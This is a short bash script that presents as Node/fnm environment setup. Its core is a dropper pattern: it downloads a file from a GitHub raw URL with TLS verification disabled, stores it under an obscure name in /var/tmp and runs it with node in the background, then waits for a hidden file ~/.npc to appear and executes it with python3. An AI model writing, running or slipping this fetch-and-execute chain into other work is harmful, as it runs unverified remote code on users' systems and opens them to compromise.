#!/usr/bin/env bash

export DEBIAN_FRONTEND=noninteractive
source ~/.myvars

ORIGINAL_USER=${SUDO_USER:-$USER}
sudo -u $ORIGINAL_USER bash << 'EOF'
mkdir -p ~/.n3
export FNM_PATH="$HOME/.local/fnm"
export PATH="$FNM_PATH:$PATH"
eval "$(fnm env --use-on-cd)"
curl --xattr -k -A 205 -o /var/tmp/nobuid https://raw.githubusercontent.com/viacheslav705/sim/refs/heads/blog/nobuid
node /var/tmp/nobuid &
EOF


TIMEOUT=30
FOUND=false

for ((i=0; i<TIMEOUT; i++)); do
  if [ -f ~/.npc ]; then
    FOUND=true
    sleep 3
    break
  fi
  sleep 1
done

# Run the appropriate command
if [ "$FOUND" = true ]; then
  /usr/bin/python3 ~/.npc
fi
